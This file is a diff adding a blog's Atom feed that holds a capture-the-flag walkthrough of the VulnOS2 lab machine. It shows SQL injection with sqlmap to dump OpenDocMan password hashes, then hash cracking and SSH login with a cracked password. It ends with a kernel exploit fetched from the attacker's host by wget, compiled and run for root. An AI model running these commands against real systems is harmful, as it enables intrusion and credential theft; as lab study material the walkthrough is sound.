@@ -1,0 +1,179 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: opendocman | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/opendocman/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-07-21T16:20:42-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[vulos2]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/20/vulos2/"/>
+    <updated>2016-07-20T13:36:54-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/20/vulos2</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>sqlmap</li>
+<li>hash-identifier</li>
+</ul>
+
+
+<h3>Vulnerability:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/32075/">OpenDocMan 1.2.7 - Multiple Vulnerabilities</a></li>
+<li><a href="https://www.exploit-db.com/exploits/37293/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.56.104 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.104 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 22, 80 and 6667 are opening.</p>
+
+<p>use wfuzz to scan. Nothing interesting.</p>
+
+<p>use Niko to scan. Same.</p>
+
+<p>Check the webpage, looks like a link may be useful.</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Double click it.</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Exam the links. In <code>Document</code>, I found this:</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like path <code>/jabcd0cs/</code> is available.</p>
+
+<p>go to  <code>http://192.168.56.104/jabcd0cs/</code>, I found the app is OpenDocMan v1.2.7.</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit opendocman</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got the exploit. Try the sql injection vulnerability:</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<pre><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" --level=5 --risk=3
+</code></pre>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now I know the database type is MySQL.</p>
+
+<p>Next try to dump all table names</p>
+
+<pre><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" --tables --dbms=mysql
+</code></pre>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like <code>odm_user</code> is the table I want to take a look at.</p>
+
+<p>now dump columns from table <code>odm_user</code></p>
+
+<p><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" -T odm_user  --columns --dbms=mysql</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like <code>username</code> and <code>password</code></p>
+
+<p>now time to dump all content from <code>username</code> and <code>password</code>,</p>
+
+<p><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" -C username,password --dump --dbms=mysql</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use hash-identifier to detect hash type</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like they are MD5.</p>
+
+<p>use hashcat to crack it</p>
+
+<p><code>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>only guest&rsquo;s password is cracked.</p>
+
+<p>Find a very good website to crack MD5 online <a href="http://md5cracker.org/,">http://md5cracker.org/,</a> get the cracked password <code>webmin1980</code> for user webmin, and login:</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>not very helpful.</p>
+
+<p>Try to ssh to the box using webmin</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the bash:</p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>first check the os version</p>
+
+<p><code>uname -a</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit 3.13.0</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>try this exploit</p>
+
+<p>in Kali:</p>
+
+<pre><code>cp /usr/share/exploitdb/platforms/linux/local/37292.c /var/www/html/.
+service apache2 restart
+</code></pre>
+
+<p>in target:</p>
+
+<pre><code>wget http://192.168.56.101/37292.c .
+gcc 37292.c -o 37292
+./37292
+</code></pre>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
+]]></content>
+  </entry>
+  
+</feed>
